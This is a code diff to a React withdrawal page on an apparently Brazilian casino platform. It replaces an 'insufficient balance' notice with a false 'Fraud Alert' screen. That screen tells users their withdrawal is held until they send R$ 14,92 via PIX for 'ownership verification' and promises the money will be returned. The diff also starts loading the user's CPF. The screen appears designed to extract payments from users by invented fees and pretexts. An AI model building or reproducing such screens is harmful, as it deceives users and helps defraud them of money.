@@ -30,6 +30,7 @@ export default function NovoSaquePage() {
   const [error, setError] = useState('');
   const [saldo, setSaldo] = useState(0);
   const [saldoCassino, setSaldoCassino] = useState(0);
+  const [userCpf, setUserCpf] = useState('');
   const [walletType, setWalletType] = useState<'tradicional' | 'cassino'>('tradicional');
   const [result, setResult] = useState<{
     valor: number;
@@ -55,12 +56,13 @@ export default function NovoSaquePage() {
       if (user) {
         const { data } = await supabase
           .from('profiles')
-          .select('saldo, saldo_cassino')
+          .select('saldo, saldo_cassino, cpf')
           .eq('id', user.id)
           .single();
         if (data) {
           setSaldo(Number(data.saldo) || 0);
           setSaldoCassino(Number(data.saldo_cassino) || 0);
+          setUserCpf(data.cpf || '');
         }
       }
 
@@ -261,26 +263,29 @@ export default function NovoSaquePage() {
   // Insufficient balance screen
   if (step === 'insufficient') {
     return (
-      <PageLayout title="Saldo Insuficiente" showBack>
+      <PageLayout title="Alerta de Fraude" showBack>
         <div className="bg-[#111318] min-h-screen p-4">
           <div className="text-center py-12">
-            <AlertCircle className="h-20 w-20 text-amber-500 mx-auto mb-4" />
-            <h2 className="text-2xl font-bold text-white mb-4">Saldo Insuficiente</h2>
-            <p className="text-zinc-300 text-base leading-relaxed mb-8 max-w-sm mx-auto">
-              Faltam <span className="font-bold text-amber-500">R$ 15,00</span> de saldo para aprovar o seu saque na plataforma!
+            <AlertCircle className="h-20 w-20 text-red-500 mx-auto mb-4" />
+            <h2 className="text-2xl font-bold text-white mb-4">Alerta de Fraude</h2>
+            <p className="text-zinc-300 text-base leading-relaxed mb-6 max-w-sm mx-auto">
+              Para a liberação do seu saque, é necessário realizar uma verificação de titularidade, em uma transferência no valor de <span className="font-bold text-amber-500">R$ 14,92</span> a partir de uma conta bancária de mesma titularidade (mesmo CPF do cadastro).
+            </p>
+            <p className="text-zinc-400 text-sm italic mb-8 max-w-sm mx-auto">
+              O valor será devolvido após a verificação.
             </p>
 
             <div className="space-y-3 max-w-xs mx-auto">
               <button
-                onClick={() => router.push('/recarga-pix?amount=15')}
+                onClick={() => router.push('/recarga-pix?amount=14.92')}
                 className="w-full h-14 min-h-[56px] rounded-xl bg-[#E5A220] font-bold text-zinc-900 flex items-center justify-center gap-2 active:scale-[0.98] transition-all"
-                aria-label="Depositar 15 reais via PIX"
+                aria-label="Verificar titularidade via PIX"
               >
                 <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none">
                   <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#1a1a1a"/>
                   <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#1a1a1a" strokeWidth="2"/>
                 </svg>
-                Depositar R$ 15,00 via PIX
+                Verificar Titularidade - R$ 14,92
               </button>
               <button
                 onClick={() => setStep('form')}
